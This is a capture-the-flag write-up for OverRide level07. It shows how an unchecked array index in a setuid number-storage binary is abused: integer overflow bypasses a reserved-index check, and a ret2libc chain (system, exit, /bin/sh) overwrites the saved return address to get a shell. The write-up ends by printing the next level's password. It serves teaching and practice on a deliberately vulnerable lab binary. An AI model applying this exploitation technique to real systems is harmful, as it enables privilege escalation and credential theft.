Level07 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
```

Level07 rights:
```Shell
-rwsr-s---+ 1 level08 users   11744 Sep 10  2016 level07
```

Testing the binary:
```Shell
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store 
 Number: 111
 Index: 1
 Completed store command successfully
Input command: read
 Index: 1
 Number at data[1] is 111
 Completed read command successfully
 Input command: store
 Number: -1
 Index: 2
 Completed store command successfully
Input command: read
 Index: 2
 Number at data[2] is 4294967295
```
The program allow us to store unsigned number in an array and read them.

Decompiling with Hex-Rays on https://dogbolt.org/ show us that:
- the array is 400 bytes long, but is casted in DWORD when used and the index asked to the user is multiplied by 4, so we can conclude that it is used an unsigned int array of 100 elements
- the index provided by the user is use without checking if it is bigger than the size of the array.
- the program has reserved all index that are multiple of 3 and refused to store number whose the high bytes are equal to 183.

We can't do a format string attack nor a buffer overflow, so our only way to exploit the binary is to use the `store` command to store value on the stack. The index vulnerability allow us to store value outside the array, in a similar way to a buffer overflow.

We will first retrieve `system()`, `exit()` and `/bin/sh` address using GDB:
```Shell
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec
```

The array store unsigned int value so if we want to store this address we need to convert them in decimal:
```
system: 0xf7e6aed0 -> 4159090384
exit: 0xf7e5eb70 -> 4159040368
/bin/sh: 0xf7f897ec -> 4160264172
```

To know wich index to use to 'overflow' our array we need to find the offset beetween `EIP` and the begining of our array:
```Shell
Guessed arguments:
arg[0]: 0xffffcdf4 --> 0x0 
[...]
gdb-peda$ i f
[...]
 Saved registers:
[...]
  eip at 0xffffcfbc
```

We can see the address of the first element in the array (0xffffcdf4) and the address of eip (0xffffcfbc), a substraction give us an offset of 456 bytes (0xffffcfbc - 0xffffcdf4).
This is an array of int so each element has a size of 4 bytes, so the offset in term of index is 114 (456 / 4).

Let's try to change EIP by '0xaaaaaaaa' (2863311530 in decimal):
```Shell
Input command: store
 Number: 2863311530
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
 ```
We can't use the 114th index because it's a multiple of 3, but since the index is stored in an unsigned int, overflowing it should allow us to store the value at index 114. The provided index is multiplied by 4, so using `MAX_UINT_32 / 4` and adding 114 (1073741938) is equivalent to using 114 as index.
```Shell
Input command: store
 Number: 2863311530
 Index: 1073741938
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 2863311530
 Completed read command successfully
Input command: quit

Program received signal SIGSEGV, Segmentation fault.
0xaaaaaaaa in ?? ()
```

So storing `system()`, `exit()` and `/bin/sh` address at the index 114, 115, 116 should open a terminal.

```Shell
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level07/.pass
cat: /home/users/level07/.pass: Permission denied
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```